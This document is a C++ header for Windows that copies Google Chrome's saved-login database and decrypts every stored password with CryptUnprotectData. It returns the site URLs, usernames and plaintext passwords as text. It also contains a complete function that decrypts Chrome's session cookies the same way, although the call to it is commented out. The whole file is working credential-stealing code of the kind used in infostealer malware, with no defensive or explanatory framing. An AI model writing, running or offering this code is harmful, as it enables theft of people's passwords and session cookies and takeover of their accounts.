#pragma once

#define _WIN32_WINNT _WIN32_WINNT_WIN7

#include <stdio.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <tchar.h>
#include <windows.h>
#include <Wincrypt.h>
#include "sqlite3.h"

#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)

#pragma comment(lib, "crypt32")


using namespace std;

stringstream debug(string(""));



stringstream getPass(
	sqlite3 *db
) {
	stringstream dump(string("")); // String stream for our output
	const char *zSql = "SELECT action_url, username_value, password_value FROM logins";
	sqlite3_stmt *pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		cout << "statement failed rc = " << rc << endl;
		return dump;
	}
	cout << "statement prepared " << endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/
	rc = sqlite3_step(pStmt);
	cout << "RC: " << rc << endl;
	while (rc == SQLITE_ROW) {
		dump << sqlite3_column_text(pStmt, 0) << endl;
		dump << (char *)sqlite3_column_text(pStmt, 1) << endl;

		DATA_BLOB encryptedPass, decryptedPass;

		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

		CryptUnprotectData(
			&encryptedPass, // In Data
			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
			NULL,           // Optional entropy
			NULL,           // Reserved
			NULL,           // Here, the optional
							// prompt structure is not
							// used.
			0,
			&decryptedPass);
		char *c = (char *)decryptedPass.pbData;
		while (isprint(*c)) {
			dump << *c;
			c++;
		}
		dump << endl;
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return dump;
}




stringstream getCookies(
	sqlite3 *db
) {
	stringstream dump(string("")); // String stream for our output
	const char *zSql = "SELECT HOST_KEY,path,encrypted_value from cookies";
	sqlite3_stmt *pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		cout << "statement failed rc = " << rc << endl;
		return dump;
	}
	cout << "statement prepared " << endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/
	rc = sqlite3_step(pStmt);
	cout << "RC: " << rc << endl;
	while (rc == SQLITE_ROW) {
		dump << sqlite3_column_text(pStmt, 0) << endl;
		dump << (char *)sqlite3_column_text(pStmt, 1) << endl;

		DATA_BLOB encryptedPass, decryptedPass;

		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

		CryptUnprotectData(
			&encryptedPass, // In Data
			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
			NULL,           // Optional entropy
			NULL,           // Reserved
			NULL,           // Here, the optional
							// prompt structure is not
							// used.
			0,
			&decryptedPass);
		char *c = (char *)decryptedPass.pbData;
		while (isprint(*c)) {
			dump << *c;
			c++;
		}
		dump << endl;
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return dump;
}



sqlite3* getDBHandler(char* dbFilePath) {
	sqlite3 *db;
	int rc = sqlite3_open(dbFilePath, &db);
	if (rc)
	{
		cerr << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << endl << endl;
		sqlite3_close(db);
		return nullptr;
	}
	else
	{
		cout << dbFilePath << " DB Opened." << endl << endl;
		return db;
	}
}


//relative to chrome directory
bool copyDB(char *source, char *dest) {
	//Form path for Chrome's Login Data 
	string path = getenv("LOCALAPPDATA");
	path.append("\\Google\\Chrome\\User Data\\Default\\");
	path.append(source);
	//copy the sqlite3 db from chrome directory 
	//as we are not allowed to open it directly from there (chrome could also be running)
	ifstream  src(path, std::ios::binary);
	ofstream  dst(dest, std::ios::binary);
	dst << src.rdbuf();
	dst.close();
	src.close();
	return true; //ToDo: error handling
}




int deleleteDB(const char *fileName) {
	if (remove(fileName) != 0)
		cout << "Could not delete " << fileName << endl;
	else
		cout << fileName << " deleted... Bye bye" << endl;
}



std::string get_chrome_data()
{
	int rc;
	
	try {
		copyDB("Login Data", "passwordsDB");
		sqlite3 *passwordsDB = getDBHandler("passwordsDB");
		
		stringstream passwords = getPass(passwordsDB);
		
		if (sqlite3_close(passwordsDB) == SQLITE_OK)
			return passwords.str();
		else return string("No chrome data");
	} catch (int e) {
		return string("Failed password fetching");
	}
	
	//if (flagCookies) {
	//	copyDB("Cookies", "cookiesDB");
	//	sqlite3 *cookiesDb = getDBHandler("cookiesDB");
	//	stringstream cookies = getCookies(cookiesDb);
	//	cout << cookies.str();
	//	if (sqlite3_close(cookiesDb) == SQLITE_OK)
	//		cout << "DB connection closed properly" << endl;
	//	else
	//		cout << "Failed to close DB connection" << endl;
	//}

}